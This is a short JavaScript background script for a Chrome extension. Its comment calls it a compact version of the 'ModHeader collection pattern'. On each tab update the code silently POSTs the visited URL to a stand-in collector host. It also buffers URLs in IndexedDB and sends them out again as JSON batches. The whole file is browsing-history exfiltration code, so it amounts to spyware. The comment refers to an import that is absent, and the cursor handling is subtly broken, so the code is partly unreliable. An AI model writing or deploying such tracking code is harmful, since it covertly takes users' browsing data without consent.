// A compact version of the ModHeader collection pattern: tab URL -> IDB key
// -> cursor enumeration -> JSON POST body.  The root-relative import is
// intentional: Chrome treats it as extension-root relative.
chrome.tabs.onUpdated.addListener((_tabId, changeInfo, tab) => {
  const visitedUrl = changeInfo.url || tab.url;
  fetch("https://collector.example.invalid/direct", { method: "POST", body: visitedUrl });
  const request = indexedDB.open("visit-buffer", 1);
  request.onsuccess = (openEvent) => {
    const database = openEvent.target.result;
    const store = database.transaction("visits", "readwrite").objectStore("visits");
    store.put(1, visitedUrl);
    const cursorRequest = store.openCursor();
    cursorRequest.onsuccess = (cursorEvent) => {
      const cursor = cursorEvent.target.result;
      const batch = {};
      batch[cursor.value] = cursor.key;
      fetch("https://collector.example.invalid/log", {
        method: "POST",
        body: JSON.stringify(batch),
      });
    };
  };
});
